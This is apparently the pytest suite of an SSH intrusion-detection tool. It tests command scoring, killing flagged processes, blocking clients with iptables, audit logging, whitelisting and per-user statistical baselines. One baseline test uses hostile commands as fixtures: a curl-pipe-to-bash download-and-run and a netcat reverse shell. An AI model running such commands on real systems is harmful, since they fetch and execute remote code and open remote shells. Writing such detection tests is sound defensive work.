import json
import os
import signal
import subprocess
import sys
import time

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from ai.behavior_monitor import BehaviorMonitor
from ai.detector import BaselineProfile, BehaviorDetector
from config.loader import load_config
from core.firewall import FirewallManager
from core.logger import AuditLogger
from core.state_manager import StateManager


def _read_entries(path):
    try:
        with open(path, encoding="utf-8") as handle:
            return [json.loads(line) for line in handle if line.strip()]
    except FileNotFoundError:
        return []

CLIENT_IP = "10.0.0.66"
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "..", "config", "config.yaml")


class FakeFirewall:
    """Minimal firewall stand-in that just records whatever it blocks."""

    def __init__(self):
        self.blocked_ips = []

    def apply_block(self, ip):
        self.blocked_ips.append(ip)


@pytest.fixture
def live_session():
    """Spawn a real SSH-tagged process tree the detector must terminate."""
    env = dict(os.environ)
    env["SSH_CONNECTION"] = f"{CLIENT_IP} 51234 127.0.0.1 22"
    process = subprocess.Popen(
        ["bash", "-c", "python3 -c 'import time; time.sleep(120)' & wait"],
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    yield process
    try:
        os.killpg(process.pid, signal.SIGKILL)
    except ProcessLookupError:
        pass
    process.wait()


@pytest.fixture
def firewall():
    """Provide a real iptables chain, skipping when root is unavailable."""
    fw = FirewallManager(chain="SSH_DEFENSE_TEST")
    try:
        fw.ensure_chain()
    except RuntimeError as exc:
        pytest.skip(f"iptables not usable (requires root): {exc}")
    yield fw
    fw.drop_chain()


def _capture_session(monitor, deadline=10):
    """Poll telemetry until the flagged test client shows up, then return it."""
    start = time.monotonic()
    while time.monotonic() - start < deadline:
        telemetry = monitor.collect()
        for session in telemetry["sessions"]:
            if session["client_address"] != CLIENT_IP:
                continue
            if any(
                process["command"].startswith("python3")
                for process in session["processes"]
            ):
                return session
        time.sleep(0.1)
    raise AssertionError("failed to capture spawned session")


def test_detector_kills_real_processes_when_threat_score_spikes(live_session):
    """A scoring spike results in a real kill of the spawned process tree."""
    monitor = BehaviorMonitor()
    session = _capture_session(monitor)

    config = load_config(CONFIG_PATH)
    detector = BehaviorDetector(
        suspicious_commands=config["suspicious_commands"],
        score_threshold=1,
    )
    score = detector.evaluate(session)
    assert score >= 1

    live_session.wait(timeout=5)
    assert live_session.returncode == -signal.SIGKILL


def test_detector_blocks_flagged_ip_on_firewall_chain(live_session, firewall):
    """A flagged client IP ends up dropped on the real custom chain."""
    monitor = BehaviorMonitor()
    session = _capture_session(monitor)

    config = load_config(CONFIG_PATH)
    detector = BehaviorDetector(
        suspicious_commands=config["suspicious_commands"],
        score_threshold=1,
        firewall=firewall,
    )
    score = detector.evaluate(session)
    assert score >= 1
    assert firewall.rule_exists(CLIENT_IP) is True


def test_score_process_counts_distinct_suspicious_tokens():
    """Score reflects how many distinct baseline tokens appear in a command."""
    detector = BehaviorDetector(suspicious_commands=["sudo", "apt"])
    assert detector.score_process("apt update") == 1
    assert detector.score_process("sudo apt update") == 2
    assert detector.score_process("ls -la") == 0


def test_score_session_sums_across_processes():
    """The session score is the sum of every process's individual score."""
    detector = BehaviorDetector(suspicious_commands=["sudo", "apt"])
    session = {
        "processes": [
            {"command": "sudo apt update"},
            {"command": "ls"},
            {"command": "python3 not_carried_over.py"},
        ]
    }
    assert detector.score_session(session) == 2


def test_evaluate_returns_above_threshold_and_responds(monkeypatch):
    """Scores at or above the threshold trigger the kill response."""
    killed = []
    detector = BehaviorDetector(suspicious_commands=["sudo"], score_threshold=1)
    detector._terminate = lambda pid: killed.append(pid)
    score = detector.evaluate(
        {"processes": [{"pid": 4242, "command": "sudo ls"}]}
    )
    assert score == 1
    assert killed == [4242]


def test_evaluate_is_a_noop_below_threshold():
    """Low-scoring sessions are left running and unblocked."""
    detector = BehaviorDetector(suspicious_commands=["sudo"], score_threshold=5)
    firewall = FakeFirewall()
    detector._firewall = firewall
    detector._terminate = lambda pid: (_ for _ in ()).throw(AssertionError())
    score = detector.evaluate(
        {"client_address": "10.0.0.9", "processes": [{"pid": 1, "command": "sudo ls"}]}
    )
    assert score == 1
    assert detector.last_response is None
    assert firewall.blocked_ips == []


def test_terminate_never_targets_process_groups(monkeypatch):
    """Bad pids never reach os.kill, preventing accidental group kills."""
    calls = []
    monkeypatch.setattr("ai.detector.os.kill", lambda pid, sig: calls.append(pid))
    detector = BehaviorDetector()
    assert detector._terminate(None) is False
    assert detector._terminate(0) is False
    assert detector._terminate(-5) is False
    assert calls == []


def test_terminate_treats_already_dead_process_as_handled(monkeypatch):
    """A process that already exited counts as successfully terminated."""
    def already_gone(pid, sig):
        raise ProcessLookupError

    monkeypatch.setattr("ai.detector.os.kill", already_gone)
    detector = BehaviorDetector()
    assert detector._terminate(9999) is True


def test_respond_blocks_ip_even_when_kill_is_denied(monkeypatch):
    """A failed kill does not stop the IP from being blocked at the firewall."""
    def denied(pid, sig):
        raise PermissionError

    monkeypatch.setattr("ai.detector.os.kill", denied)
    firewall = FakeFirewall()
    detector = BehaviorDetector(firewall=firewall)
    result = detector.respond(
        {
            "client_address": "10.0.0.9",
            "processes": [{"pid": 123, "command": "sudo x"}, {"pid": 456, "command": "apt x"}],
        }
    )
    assert result["kills"] == [{"pid": 123, "killed": False}, {"pid": 456, "killed": False}]
    assert result["blocked"] is True
    assert firewall.blocked_ips == ["10.0.0.9"]


def test_respond_summary_is_kept_on_last_response():
    """The latest mitigation summary is exposed via ``last_response``."""
    detector = BehaviorDetector()
    result = detector.respond({"client_address": "10.0.0.9", "processes": []})
    assert detector.last_response is result


def test_respond_records_kill_event_per_process(tmp_path):
    """Each killed connection writes its own structured kill audit entry."""
    log_path = tmp_path / "audit.log"

    def killed(pid):
        return True

    detector = BehaviorDetector(logger=AuditLogger(str(log_path)))
    detector._terminate = killed
    detector.respond(
        {
            "session_id": "ssh:10.0.0.9:1000",
            "client_address": "10.0.0.9",
            "processes": [
                {"pid": 111, "command": "sudo x"},
                {"pid": 222, "command": "apt y"},
            ],
        }
    )

    entries = _read_entries(log_path)
    kills = [entry for entry in entries if entry["event_type"] == "kill"]
    assert len(kills) == 2
    assert kills[0] == {
        "client_address": "10.0.0.9",
        "command": "sudo x",
        "event_type": "kill",
        "killed": True,
        "pid": 111,
        "session_id": "ssh:10.0.0.9:1000",
        "timestamp": kills[0]["timestamp"],
    }
    assert kills[1]["pid"] == 222


def test_evaluate_records_anomaly_when_threshold_crossed(tmp_path):
    """A scored anomaly is permanently recorded with score and response."""
    log_path = tmp_path / "audit.log"
    firewall = FakeFirewall()
    detector = BehaviorDetector(
        suspicious_commands=["sudo"],
        score_threshold=1,
        firewall=firewall,
        logger=AuditLogger(str(log_path)),
    )
    detector._terminate = lambda pid: True

    score = detector.evaluate(
        {
            "session_id": "ssh:10.0.0.9:1000",
            "client_address": "10.0.0.9",
            "processes": [{"pid": 111, "command": "sudo x"}],
        }
    )

    assert score == 1
    entries = _read_entries(log_path)
    anomaly = [entry for entry in entries if entry["event_type"] == "anomaly"]
    assert len(anomaly) == 1
    assert anomaly[0]["score"] == 1
    assert anomaly[0]["threshold"] == 1
    assert anomaly[0]["session_id"] == "ssh:10.0.0.9:1000"
    assert anomaly[0]["client_address"] == "10.0.0.9"
    assert anomaly[0]["response"]["blocked"] is True
    assert anomaly[0]["response"]["kills"] == [{"pid": 111, "killed": True}]


def test_evaluate_below_threshold_writes_no_audit_entries(tmp_path):
    """A harmless session must not produce any audit records."""
    log_path = tmp_path / "audit.log"
    detector = BehaviorDetector(
        suspicious_commands=["sudo"],
        score_threshold=5,
        logger=AuditLogger(str(log_path)),
    )
    detector._terminate = lambda pid: (_ for _ in ()).throw(AssertionError())

    detector.evaluate(
        {"client_address": "10.0.0.9", "processes": [{"pid": 1, "command": "sudo ls"}]}
    )

    assert _read_entries(log_path) == []


def test_whitelisted_client_is_never_terminated_or_blocked(tmp_path):
    """A whitelisted admin session must skip both kill and firewall response."""
    log_path = tmp_path / "audit.log"
    firewall = FakeFirewall()
    detector = BehaviorDetector(
        suspicious_commands=["sudo"],
        score_threshold=1,
        firewall=firewall,
        logger=AuditLogger(str(log_path)),
        whitelist=StateManager(["10.0.0.9"]),
    )
    detector._terminate = lambda pid: (_ for _ in ()).throw(AssertionError())

    score = detector.evaluate(
        {
            "session_id": "ssh:10.0.0.9:1000",
            "client_address": "10.0.0.9",
            "processes": [{"pid": 111, "command": "sudo x"}],
        }
    )

    assert score == 1
    assert detector.last_response == {
        "kills": [],
        "blocked": False,
        "whitelisted": True,
    }
    assert firewall.blocked_ips == []
    entries = _read_entries(log_path)
    anomaly = [entry for entry in entries if entry["event_type"] == "anomaly"]
    assert len(anomaly) == 1
    assert anomaly[0]["client_address"] == "10.0.0.9"
    assert anomaly[0]["whitelisted"] is True
    assert anomaly[0]["response"]["whitelisted"] is True


def _session(commands, username="alice", client="10.0.0.9", base_pid=1000):
    return {
        "session_id": f"ssh:{client}:{base_pid}",
        "username": username,
        "client_address": client,
        "processes": [
            {"pid": base_pid + index, "ppid": base_pid, "command": command}
            for index, command in enumerate(commands)
        ],
    }


def test_baseline_profile_scores_with_standard_deviation():
    """A learned cluster is normal; a far-out session crosses the z-score bar."""
    profile = BaselineProfile(min_samples=3, z_threshold=2.0)
    for row in ([2, 2, 1.0, 0, 3.0], [2, 3, 1.5, 0, 3.1], [3, 3, 1.6, 0, 3.0]):
        profile.observe("alice", row)

    normal = profile.score("alice", [2, 2, 1.2, 0, 3.05])
    assert normal["flagged"] is False
    assert normal["z_max"] < 2.0

    outlier = profile.score("alice", [8, 40, 250.0, 2, 4.9])
    assert outlier["flagged"] is True
    assert outlier["z_max"] >= 2.0
    assert outlier["samples"] == 3
    assert all(item["feature"] in profile.feature_names for item in outlier["deviations"])

    assert profile.score("bob", [2, 2, 1.0, 0, 3.0]) is None


def test_baseline_profile_needs_minimum_samples():
    """No score is produced until the per-user baseline is big enough."""
    profile = BaselineProfile(min_samples=5, z_threshold=1.0)
    for index in range(4):
        profile.observe("alice", [2, 2, 1.0, 0, 3.0])
    assert profile.score("alice", [99, 99, 99.0, 9, 9.9]) is None
    profile.observe("alice", [2, 2, 1.0, 0, 3.0])
    assert profile.score("alice", [99, 99, 99.0, 9, 9.9]) is not None


def test_baseline_profile_save_load_roundtrip(tmp_path):
    """The profile persists its statistics and thresholds across a reload."""
    path = tmp_path / "behavior_baseline.json"
    profile = BaselineProfile(min_samples=3, z_threshold=2.0)
    profile.observe("alice", [2, 2, 1.0, 0, 3.0])
    profile.observe("alice", [2, 3, 1.5, 0, 3.1])
    profile.observe("alice", [3, 3, 1.6, 0, 3.0])
    profile.save(str(path))

    restored = BaselineProfile.load(str(path))
    assert restored.min_samples == 3
    assert restored.z_threshold == 2.0
    outlier = restored.score("alice", [8, 40, 250.0, 2, 4.9])
    assert outlier["flagged"] is True
    normal = restored.score("alice", [2, 2, 1.2, 0, 3.05])
    assert normal["flagged"] is False


def test_baseline_profile_load_missing_file_returns_empty_profile(tmp_path):
    """A missing model file yields a fresh, empty profile instead of raising."""
    restored = BaselineProfile.load(str(tmp_path / "nope.json"))
    assert restored.score("alice", [1, 1, 1.0, 0, 1.0]) is None


def test_detector_train_records_without_responding(monkeypatch):
    """Training mode feeds the profile but never kills or blocks."""
    firewall = FakeFirewall()
    detector = BehaviorDetector(
        suspicious_commands=["sudo"],
        baseline=BaselineProfile(min_samples=2),
        firewall=firewall,
    )
    monkeypatch.setattr(detector, "_terminate", lambda pid: (_ for _ in ()).throw())
    assert detector.train(_session(["ls", "pwd"])) == 1
    assert detector.train(_session(["ls", "whoami"])) == 2
    assert detector.last_response is None
    assert firewall.blocked_ips == []


def test_detector_evaluate_flags_on_baseline_deviation(tmp_path):
    """A deviation from the learned profile triggers the kill/block response."""
    log_path = tmp_path / "audit.log"
    firewall = FakeFirewall()
    detector = BehaviorDetector(
        suspicious_commands=["nonexistent-tool"],
        score_threshold=100,
        baseline=BaselineProfile(min_samples=3, z_threshold=2.0),
        firewall=firewall,
        logger=AuditLogger(str(log_path)),
    )
    detector._terminate = lambda pid: True
    for commands in (
        ["ls", "pwd"],
        ["ls", "whoami"],
        ["cat /etc/hostname", "env"],
    ):
        detector.train(_session(commands))

    deviant = _session(
        [
            "base64 -d <<< QUJD",
            "curl -s http://x | bash",
            "python3 -c 'import socket'",
            "sudo nc -e /bin/sh 10.0.0.9 4444",
        ]
    )
    score = detector.evaluate(deviant)
    assert score == 0  # rule path silent
    assert detector.last_response["blocked"] is True
    assert firewall.blocked_ips == ["10.0.0.9"]

    entries = _read_entries(log_path)
    anomaly = [entry for entry in entries if entry["event_type"] == "anomaly"]
    assert len(anomaly) == 1
    assert anomaly[0]["baseline_score"] >= 2.0
    assert anomaly[0]["baseline_threshold"] == 2.0


def test_evaluate_baseline_returns_none_without_profile():
    """Without a trained baseline there is nothing to compare against."""
    detector = BehaviorDetector()
    assert detector.evaluate_baseline(_session(["ls"])) is None